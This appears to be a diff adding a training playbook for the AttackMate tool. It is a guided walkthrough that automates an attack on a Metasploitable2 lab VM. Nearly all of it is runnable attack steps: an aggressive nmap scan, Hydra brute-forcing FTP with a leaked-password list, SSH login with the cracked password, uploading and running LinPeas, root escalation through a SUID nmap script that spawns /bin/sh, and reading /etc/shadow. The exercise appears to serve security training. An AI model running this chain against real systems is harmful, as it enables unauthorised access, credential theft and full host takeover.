@@ -1,0 +1,153 @@
+#
+# Walkthrough 4: SSH Attack Chain
+# Description:
+#     Full guided walkthrough of the SSH example playbook.
+#     This is the main Day 1 guided exercise.
+#
+#     Attack steps:
+#     1. Scan the Metasploitable2 VM with nmap
+#     2. Bruteforce FTP credentials with Hydra
+#     3. Parse the password from Hydra's output using regex
+#     4. Log in via SSH using the discovered password
+#     5. Upload and execute LinPeas for privilege escalation enumeration
+#     6. Exploit nmap SUID binary to escalate to root
+#     7. Verify root access by reading /etc/shadow
+#
+# Requirements:
+#     - Metasploitable2 VM running and reachable
+#     - nmap, hydra installed on the attacker machine
+#     - seclists installed (/usr/share/seclists/)
+#     - linpeas.sh pre-installed at /opt/tools/linpeas.sh
+#
+# IMPORTANT: Replace the METASPLOITABLE variable with your target's IP!
+#
+# Run with:
+#     attackmate 04_ssh_attack_chain.yml
+#
+
+vars:
+  METASPLOITABLE: 172.17.0.106
+  PASSWDLIST: /usr/share/seclists/Passwords/darkweb2017-top1000.txt
+
+commands:
+  # ============================================
+  # STEP 1: Reconnaissance
+  # Run an aggressive nmap scan to discover services.
+  # The output is stored in $RESULT_STDOUT automatically.
+  # ============================================
+  - type: shell
+    cmd: nmap -A -T4 $METASPLOITABLE
+
+  # ============================================
+  # STEP 2: Credential Bruteforcing
+  # Hydra will try passwords from our wordlist against the FTP service.
+  # If successful, it prints: "[21][ftp] host: ... login: user password: <pw>"
+  # ============================================
+  - type: shell
+    cmd: hydra -l user -P $PASSWDLIST $METASPLOITABLE ftp
+
+  # ============================================
+  # STEP 3: Parse the Password
+  # Use regex to extract the password from Hydra's output.
+  # The capture group (.+) at the end captures everything after "password: "
+  # The extracted value is stored in $USERPW via the output mapping.
+  # ============================================
+  - type: regex
+    cmd: ".*login: user.+password: (.+)"
+    output:
+      USERPW: "$MATCH_0"
+
+  # Verify we got it
+  - type: debug
+    cmd: "Password found: $USERPW"
+
+  # ============================================
+  # STEP 4: SSH Login
+  # Use the bruteforced password to log in via SSH.
+  # creates_session: "foothold" keeps the connection open for later commands.
+  # The cmd "id" verifies we're logged in and shows our user context.
+  # ============================================
+  - type: ssh
+    cmd: id
+    username: user
+    password: "$USERPW"
+    hostname: $METASPLOITABLE
+    creates_session: "foothold"
+
+  # ============================================
+  # STEP 5a: Upload LinPeas
+  # LinPeas is pre-installed on the attacker machine at /opt/tools/linpeas.sh.
+  # Use SFTP to upload it to the target.
+  # The session: "foothold" reuses our existing SSH connection.
+  # mode: "777" makes the uploaded file executable.
+  # ============================================
+  - type: sftp
+    cmd: put
+    local_path: /opt/tools/linpeas.sh
+    remote_path: /tmp/linpeas.sh
+    session: "foothold"
+    mode: "777"
+
+  - type: debug
+    cmd: "Executing LinPeas in superfast mode (-s). This skips slow checks but still detects SUID binaries."
+
+  # ============================================
+  # STEP 5b: Execute LinPeas
+  # Run LinPeas on the target in interactive mode.
+  #
+  # The -s flag enables "superfast" mode, which skips time-consuming checks
+  # (process monitoring, brute-force attempts, deep filesystem regex searches)
+  # but still runs core enumeration including SUID/SGID detection.
+  #
+  # Why interactive mode?
+  # - LinPeas produces output over a long period
+  # - Normal mode would timeout waiting for it to finish
+  #
+  # Why command_timeout: 0?
+  # - LinPeas can pause for extended periods between outputs
+  # - Setting timeout to 0 means "wait indefinitely"
+  #
+  # The save: option writes all output to a local file for review.
+  # exit_on_error: False because LinPeas may return non-zero.
+  # ============================================
+  - type: ssh
+    cmd: "bash /tmp/linpeas.sh -s\n"
+    save: /tmp/linpeas_output.txt
+    exit_on_error: False
+    interactive: True
+    command_timeout: 0
+
+  # ============================================
+  # STEP 6: Privilege Escalation
+  # LinPeas found that nmap has SUID permissions.
+  # Old versions of nmap have an --interactive mode that lets you
+  # run shell commands as the nmap user (root, because of SUID).
+  #
+  # Step 6a: Create a nmap script file that executes /bin/sh
+  # Step 6b: Run nmap with --script pointing to our payload
+  # ============================================
+  - type: ssh
+    cmd: echo "os.execute('/bin/sh')" > somefile
+    session: foothold
+
+  # We need interactive mode because this opens a new shell
+  # The \n at the end is required for interactive commands
+  - type: ssh
+    cmd: "nmap --script=./somefile localhost\n"
+    session: foothold
+    interactive: True
+
+  # ============================================
+  # STEP 7: Verify Root Access
+  # We should now be running as root in the session.
+  # ============================================
+  - type: ssh
+    cmd: "id\n"
+    session: foothold
+    interactive: True
+
+  # only root shold be able to read read /etc/shadow
+  - type: ssh
+    cmd: "grep root /etc/shadow\n"
+    session: foothold
+    interactive: True
